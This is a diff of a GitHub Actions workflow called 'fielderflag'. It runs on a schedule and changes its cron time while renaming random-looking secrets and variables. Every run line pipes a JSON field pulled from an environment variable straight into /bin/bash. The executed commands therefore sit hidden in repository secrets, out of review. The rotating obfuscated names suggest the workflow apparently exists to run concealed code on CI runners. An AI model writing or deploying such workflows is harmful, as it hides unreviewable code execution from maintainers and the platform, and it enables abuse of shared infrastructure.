@@ -1,27 +1,22 @@
 name: fielderflag
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '28 2/6 * * *'
-
+    - cron: '51 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: fielderflag
         env:
-          rko37673: ${{ secrets.rko37673 }}
+          qj32547: ${{ secrets.qj32547 }}
         run: |
-          echo $rko37673 | jq -r .c834 | /bin/bash
-          echo $utfi2 | jq -r .m6 | /bin/bash
-          echo $kn309 | jq -r .dnc20 | /bin/bash
-          echo $zs5 | jq -r .fljxg462 | /bin/bash
-          echo $vg2 | jq -r .dsvpr6992 | /bin/bash
-          echo $mde916 | jq -r .odfv4 | /bin/bash
-          echo $ohc2526 | jq -r .vpbp20110 | /bin/bash
-          echo $qx44 | jq -r .sugv967 | /bin/bash
-          echo $relmd65 | jq -r .x69 | /bin/bash
+          echo $qj32547 | jq -r .ef00 | /bin/bash
+          echo $kkfou9 | jq -r .rf80 | /bin/bash
+          echo $kedw28647 | jq -r .mzaqx94 | /bin/bash
+          echo $ljpd950 | jq -r .bfwav01678 | /bin/bash
+          echo $acf037 | jq -r .zekdl43 | /bin/bash
+          echo $mvh64 | jq -r .ykoi69 | /bin/bash
+          echo $kxlwk07764 | jq -r .u488 | /bin/bash
 
